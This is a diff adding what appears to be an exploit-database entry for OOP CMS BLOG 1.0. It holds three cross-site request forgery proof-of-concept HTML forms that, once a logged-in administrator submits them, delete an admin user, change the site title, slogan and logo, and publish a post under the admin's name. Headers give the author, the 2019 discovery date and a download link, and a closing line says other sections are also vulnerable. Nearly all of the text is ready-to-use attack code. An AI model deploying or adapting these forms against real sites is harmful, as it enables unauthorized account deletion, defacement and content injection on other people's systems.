@@ -1,0 +1,175 @@
+# Exploit Title: OOP CMS BLOG 1.0 - Cross-Site Request Forgery (Delete Admin)
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: March 1, 2019
+# Vendor Homepage: http://zsoft.com.bd/
+# Software Link : https://datapacket.dl.sourceforge.net/project/php-oop-cms-blog/blog_fo_rup.zip
+# Tested Version: 1.0
+# Tested on: Kali linux, Windows 8.1 
+
+
+# PoC:
+
+<html>
+<body>
+	<form method="post" action="http://localhost/[PATH]/admin/userList.php?delUser=34">
+		<input type="submit" value="Delete">
+	</form>
+</body>
+</html>
+
+
+# Exploit Title: OOP CMS BLOG 1.0 - Cross-Site Request Forgery (Update Site Title and Description)
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: March 1, 2019
+# Vendor Homepage: http://zsoft.com.bd/
+# Software Link : https://datapacket.dl.sourceforge.net/project/php-oop-cms-blog/blog_fo_rup.zip
+# Tested Version: 1.0
+# Tested on: Kali linux, Windows 8.1 
+
+
+# PoC:
+
+<html>
+<body>
+<form method="post" action="http://localhost/[PATH]/admin/titleslogan.php" enctype="multipart/form-data">
+<table class="form">
+<tr>
+<td>
+<label>Website Title</label>
+</td>
+<td>
+<input type="text" name="title">
+</td>
+</tr>
+<tr>
+<td>
+<label>Website Slogan</label>
+</td>
+<td>
+<input type="text" name="slogan">
+</td>
+</tr>
+ 
+<tr>
+<td>
+<label>Upload Logo</label>
+</td>
+<td>
+<input type="file" name="logo"/>
+</td>
+</tr>
+<tr>
+<td>
+</td>
+<td>
+<input type="submit" name="submit" Value="Update" />
+</td>
+</tr>
+</form>
+</body>
+</html>
+
+
+
+# Exploit Title: OOP CMS BLOG 1.0 - Cross-Site Request Forgery (Add Post)
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: March 1, 2019
+# Vendor Homepage: http://zsoft.com.bd/
+# Software Link : https://datapacket.dl.sourceforge.net/project/php-oop-cms-blog/blog_fo_rup.zip
+# Tested Version: 1.0
+# Tested on: Kali linux, Windows 8.1 
+
+
+# PoC:
+
+<html>
+<body>
+<form action="http://localhost/[PATH]/admin/addpost.php" method="post" enctype="multipart/form-data">
+<table class="form">
+   
+<tr>
+<td>
+<label>Title</label>
+</td>
+<td>
+<input type="text" name="title" placeholder="Enter Post Title...">
+</td>
+</tr>
+<tr>
+<td>
+<label>Category</label>
+</td>
+<td>
+<select id="select" name="cat">
+<option value="1">Select Category</option>
+<option value="19">mr. customer</option>
+
+<option value="2">php</option>
+
+<option value="3">HTML</option>
+
+<option value="4">CSS</option>
+
+<option value="17">c++</option>
+
+<option value="7">java ajax</option>
+
+<option value="20">mr. customer</option>
+
+<option value="18">ajax</option>
+
+</select>
+</td>
+</tr>
+<tr>
+<td>
+<label>Upload Image</label>
+</td>
+<td>
+<input type="file" name="image"/>
+</td>
+</tr>
+<tr>
+<td style="vertical-align: top; padding-top: 9px;">
+<label>Content</label>
+</td>
+<td>
+<textarea class="tinymce" name="body"></textarea>
+</td>
+</tr>
+<tr>
+<td>
+<label>Tags</label>
+</td>
+<td>
+<input type="text" name="tags" placeholder="Enter Tags...">
+</td>
+</tr>   
+ <tr>
+<td>
+<label>Authors</label>
+</td>
+<td>
+<input type="text" name="authour"   value="admin">
+<input type="hidden" name="user_id"   value="29">
+</td>
+</tr>
+
+
+<tr>
+<td>
+</td>
+<td>
+<input type="submit" name="submit" Value="Save" />
+</td>
+</tr>
+</table>
+</form>
+</body>
+</html>
+
+# Note: Many other sections are vulnerable to CSRF, too.
+# For example: Delete Post, Add Slider, ...
